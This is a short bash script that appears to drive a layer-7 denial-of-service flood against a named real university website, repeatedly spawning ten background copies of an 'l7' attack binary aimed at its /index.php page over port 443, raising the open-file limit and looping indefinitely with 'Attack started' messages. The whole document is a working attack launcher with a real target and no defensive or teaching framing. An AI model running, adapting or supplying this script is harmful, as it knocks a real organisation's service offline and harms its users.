#!/bin/bash
atk_cmd="./l7 manila.lpu.edu.ph 443 /index.php 200 30"
process=10
ulimit -n 999999

while true
do
    echo Attack started
    for ((i=1;i<=$process;i++))
    do
        $atk_cmd >/dev/null &
        sleep 0.1
    done
    sleep 30
    echo Attack killed!!
done
